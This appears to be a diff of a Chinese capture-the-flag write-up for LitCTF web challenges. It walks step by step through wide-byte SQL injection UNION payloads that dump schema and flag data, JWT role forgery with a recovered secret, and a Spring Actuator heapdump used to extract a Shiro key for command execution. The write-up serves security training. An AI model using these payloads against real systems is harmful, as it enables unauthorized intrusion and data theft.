@@ -18,10 +18,10 @@ tags: [LitCTF, WP]
 
 ![image-20260523124235286](https://img.yanxisishi.top/images/2026/05/image-20260523124235286.png)
 
-也没有报错啥的，大概率是要宽字节注入，HackBar 传入：
+也没有报错啥的，大概率是要宽字节注入，浏览器上方地址中传入：
 
 ```http
-?id=1%df'
+/query?id=1%df'
 ```
 
 返回报错了：
@@ -30,11 +30,73 @@ tags: [LitCTF, WP]
 数据库错误：(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1�\\'' LIMIT 50' at line 1")
 ```
 
-接下来就是 Union 联合查询，中间的步骤不多写了：
+接下来就是 Union 联合查询：
 
-```http
-?id=-1%df' union select 1,flag,3,4,5 from flag_store%23
-```
+1. 判断列数
+
+   ```http
+   /query?id=1%df' order by 5%23
+   ```
+
+   正常回显 id 为 1 的查询结果。
+
+   ```http
+   /query?id=1%df' order by 6%23
+   ```
+
+   返回 `数据库错误：(1054, "Unknown column '6' in 'order clause'")`。
+
+   说明本题共 5 列。
+
+2. 找回显位
+
+   ```http
+   /query?id=-1%df' union select 1,2,3,4,5%23
+   ```
+
+   返回：
+
+   ```txt
+   查询结果
+   id	name	col2	col3	col4
+   1	2	3	4	5
+   ```
+
+   说明本题每一列都是回显位置。
+
+3. 爆库名
+
+   ```http
+   /query?id=-1%df' union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata%23
+   ```
+
+   得到 `information_schema,ezsql`。
+
+4. 爆 `ezsql` 库的表名
+
+   ```http
+   /query?id=-1%df' union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=0x657a73716c%23
+   ```
+
+   > 其中 `0x657a73716c` 是 `ezsql` 的十六进制。
+
+   得到 `users,flag_store`。
+
+5. 爆 `ezsql` 库的 `flag_store` 表的列名
+
+   ```http
+   /query?id=-1%df' union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=0x657a73716c%23 and table_name=0x666c61675f73746f7265
+   ```
+
+   得到 `id,name,col2,col3,col4,id,flag`。
+
+6. 爆 `flag_store` 表的 `flag` 列的数据
+
+   ```http
+   /query?id=-1%df' union select 1,flag,3,4,5 from ezsql.flag_store%23
+   ```
+
+   拿到 flag。
 
 ## lit_ezssti
 
@@ -78,13 +140,13 @@ ${7*7}
 
 先 `shift + F4` 看函数列表，`ctrl + f` 搜 `main.main`，点击去后按 F5 查看伪代码。
 
-然后我也不会了，看不懂一点，喂给 AI 了，说是能解出来一个 JWT 密钥，为：
+然后我也不会了，可以交给 re 手，说是能解出来一个 JWT 密钥，为：
 
 ```txt
 rMw_2026_litctf_jwt_secret_key!!
 ```
 
-然后回到我熟悉的 WEB 靶机页面，先去开户申请注册一个账号 `test/123456`，接着用这个帐号去登录，登录进去后点击 `进入归档中心`，显示：
+回到熟悉的 WEB 靶机页面，先去开户申请注册一个账号 `test/123456`，接着用这个帐号去登录，登录进去后点击 `进入归档中心`，显示：
 
 ```txt
 您暂无此资源的访问权限
@@ -104,7 +166,7 @@ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlzcyI6InJldmVyc
 
 ![image-20260523133055857](https://img.yanxisishi.top/images/2026/05/image-20260523133055857.png)
 
-确认后回到 `Repeater` 界面，把 role 的值从 `user` 改为 `admin`，点击 Sign ，选刚刚生成的 key 就以了。
+确认后回到 `Repeater` 界面，把 role 的值从 `user` 改为 `admin`，点击 Sign ，选刚刚生成的 key 就可以了。
 
 ## Northbridge Document Hub
 
@@ -196,4 +258,53 @@ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlzcyI6InJldmVyc
 > 某客服工单系统上线后，保留了大量运维与调试能力。
 > 你需要从系统暴露面和服务器中收集关键信息，完成权限突破并还原完整 flag
 
+非预期方法：
+
 dirsearch 扫目录看到了 `/actuator` 基本全能访问，优先去看环境变量，访问 `/actuator/env`，直接找到 flag。
+
+预期方法：
+
+访问 `/actutor/heapdump` 下载 `heapdump` 二进制文件，用 JDumpSpider 提取 Shiro key：
+
+```bash
+curl -o heapdump http://127.0.0.1:18081/actuator/heapdump
+java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
+```
+
+在返回结果中看到：
+
+```txt
+===========================================
+CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM, key = R1pDVEZTaGlyb0dDTUtleQ==, algName = AES
+```
+
+接着用 Java 8 启动 [ShiroAttack2](https://github.com/SummerSec/ShiroAttack2)，类似如下进行配置：
+
+![image-20260527114521685](https://img.yanxisishi.top/images/2026/05/image-20260527114521685.png)
+
+`cat` 命令执行拿到 flag_part1.txt：
+
+```txt
+flag{actuator_heapdump_
+```
+
+接着找别的路由看还有什么地方可能藏另一半 flag，访问 `/actuator/mappings` 看所有路由，`ctrl + f` 搜 `admin`，看到有：
+
+```txt
+/api/admin/audit/list
+/api/admin/ops/reports
+/api/admin/system/export
+/api/admin/system/summary
+```
+
+在 `/api/admin/audit/list` 中最有可能藏有 flag。
+
+先登录进去，题目给了用户名为 `user`，弱密码爆破出来密码为 `user123`，接着访问 `/api/admin/audit/list`，返回：
+
+```txt
+{"source":"audit-service","items":[{"id":"AR-8301","detail":"登录异地告警已人工复核为误报"},{"id":"AR-8302","detail":"数据库结构变更任务延后执行"},{"id":"AR-8303","detail":"历史归档备注: shiro_gcm_vertical_auth}"}]}
+```
+
+把 flag 进行拼接即可。
